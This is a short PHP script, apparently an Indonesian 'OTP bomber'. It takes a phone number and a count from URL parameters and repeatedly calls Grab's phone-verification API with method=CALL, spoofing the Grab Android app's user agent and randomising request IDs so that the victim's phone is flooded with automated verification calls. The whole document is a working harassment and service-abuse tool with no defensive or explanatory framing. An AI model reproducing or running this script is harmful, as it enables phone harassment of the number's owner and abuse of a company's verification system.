
<?php

$loop = $_GET['loop'];
$no = $_GET['no'];
		$data = "abcdefghijklmnopqrstuvwxyz1234567890";
		$l = 12;
		$word = "";
		for($a=0;$a<$l;$a++){
			$word .= $data{rand(0,strlen($data)-1)};
		}
				$b = 0;
		while($b<$loop){
		$rand = rand(0123456,9999999);
		$rands = $word;
		$post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production";
		$h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
		$h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8";
		$h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
		$h[] = "Content-Type: application/x-www-form-urlencoded";
		$h[] = "Content-Length: ".strlen($post);
		$h[] = "Host: api.grab.com";
		$h[] = "Connection: close";
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$x = curl_exec($ch); curl_close($ch);
		$ekse = json_decode($x,true);
		if(empty($ekse['challengeID'])){
			echo "Gagal\n";
		}else{
		    $nn = $b+1;
		    echo "Sukses sayang\n";
			$b++;
		}
    }
?>